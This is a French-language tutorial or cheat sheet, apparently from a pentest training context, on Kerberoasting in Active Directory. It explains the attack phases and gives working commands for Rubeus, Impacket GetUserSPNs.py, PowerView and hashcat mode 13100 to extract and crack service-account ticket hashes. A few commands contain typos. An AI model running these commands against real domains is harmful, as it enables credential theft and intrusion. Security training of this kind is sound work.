Le Kerberoasting est une technique d’attaque sophistiquée post-exploitation qui cible les comptes de service au sein des environnements Active Directory en exploitant les vulnérabilités du protocole d’authentification Kerberos. Cette attaque basée sur l’identité permet aux acteurs malveillants d’obtenir les hachages de mots de passe des comptes Active Directory associés aux noms principaux de service (SPNs), qui peuvent ensuite être crackés hors ligne pour révéler les identifiants en texte clair.
Lorsqu'un utilisateur demande un ticket de service (TS) au KDC (centre de distribution de clés), il doit envoyer un TGT (ticket d'octroi de ticket) valide et le nom `sname`du service souhaité ( ). Si le TGT est valide et que le service existe, le KDC lui envoie le TS.
# Comment fonctionne le kerberoasting 
Une attaque Kerberoasting se déroule en plusieurs phases distinctes, commençant par un accès initial au réseau et se terminant par l’extraction des mots de passe. L’attaque débute lorsqu’un acteur malveillant obtient l’accès à n’importe quel compte d’utilisateur authentifié dans le domaine. À partir de ce point d’accès, l’attaquant identifie les comptes de service avec des SPN, qui deviennent les cibles principales de l’exploitation.
#### Séquence de l’attaque :

- **Accès initial** : Obtenir les identifiants pour un compte d’utilisateur dans le domaine
- **Reconnaissance** : Énumérer les comptes de service avec des SPN
- **Demande TGS** : Demander des tickets de service au contrôleur de domaine
- **Extraction du ticket** : Capturer les tickets TGS cryptés à l’aide d’outils comme Rubeus ou Mimikatz
- **Crackage hors ligne** : Tenter de cracker les mots de passe des comptes de service
## outils 
[GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) 
[Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)

Kerberoasting avec Rubeus 

```
Rubeus.exe kerberoast
```

Maintenant, craquez ce hachage

```
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

Kerberosting avec Impacket 

Lister des comptes SPN 

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```


```
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.3.141 -request
```

## Kerberoasting - Exécution de l'attaque

Selon votre position dans un réseau, cette attaque peut être réalisée de plusieurs manières :

- À partir d'un hôte Linux non joint à un domaine utilisant des informations d'identification d'utilisateur de domaine valides.
- À partir d'un hôte Linux joint à un domaine en tant que root après avoir récupéré le fichier keytab.
- À partir d’un hôte Windows joint à un domaine authentifié en tant qu’utilisateur de domaine.
- À partir d’un hôte Windows joint à un domaine avec un shell dans le contexte d’un compte de domaine.
- En tant que SYSTÈME sur un hôte Windows joint à un domaine.
- À partir d'un hôte Windows non joint à un domaine à l'aide [de runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.
Les SPN sont des identifiants uniques utilisés par Kerberos pour associer une instance de service à un compte de service dans le contexte duquel le service est exécuté.

### kerberosting avec PowerView 


```
import-Module .\powerView.ps1
Get-DomainUser* -spn | select samaccountname
```

À partir de là, nous pourrions cibler un utilisateur spécifique et récupérer le ticket TGS au format Hashcat.

```
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

Exporter tous les tickets vers un fichier CSV

```
et-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```